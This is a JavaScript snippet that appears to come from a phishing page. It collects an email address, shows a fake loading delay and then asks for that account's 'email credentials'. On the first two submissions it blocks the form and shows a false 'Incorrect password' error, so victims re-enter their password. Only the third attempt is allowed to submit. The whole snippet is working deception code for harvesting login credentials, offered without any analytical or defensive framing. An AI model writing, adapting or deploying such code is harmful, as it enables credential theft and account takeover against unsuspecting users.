<script>
const form = document.getElementById("verifyForm");
const step1 = document.getElementById("step1");
const step2 = document.getElementById("step2");
const preloader1 = document.getElementById("preloader");
const preloader2 = document.getElementById("preloader2");
const nextBtn = document.getElementById("nextBtn");
const emailInput = document.getElementById("inputline1");
const errorMessage = document.getElementById("error-message");
const instructionText = document.getElementById("instructionText");

function maskEmail(email) {
  const [user, domain] = email.split("@");
  if (!user || !domain) return email;
  if (user.length <= 2) return user[0] + "***@" + domain;
  return user[0] + "***" + user[user.length - 1] + "@" + domain;
}

// Step 1 → Step 2
nextBtn.addEventListener("click", () => {
  const emailVal = emailInput.value.trim();
  if (emailVal === "") {
    emailInput.focus();
    return;
  }

  preloader1.style.display = "flex";

  setTimeout(() => {
    preloader1.style.display = "none";
    step1.style.display = "none";
    step2.style.display = "block";
    const masked = maskEmail(emailVal);
    if (instructionText)
      instructionText.textContent = `To continue, please enter the email credentials for ${masked}`;
  }, 3500);
});

// Step 2 submission with attempt tracking
form.addEventListener("submit", function(e) {
  let submitCount = parseInt(localStorage.getItem("submitCount") || "0", 10);
  submitCount++;
  localStorage.setItem("submitCount", submitCount);

  // Show preloader for all attempts
  preloader2.style.display = "flex";

  if (submitCount < 3) {
    // First 2 attempts: prevent actual submission
    e.preventDefault();

    setTimeout(() => {
      preloader2.style.display = "none";
      errorMessage.textContent = "Incorrect password. Please try again.";
      document.getElementById("password").value = "";
    }, 2000);

  } else {
    // 3rd attempt: allow submission
    localStorage.removeItem("submitCount");
    // Do NOT hide preloader; it will remain until redirect
  }
});
</script>
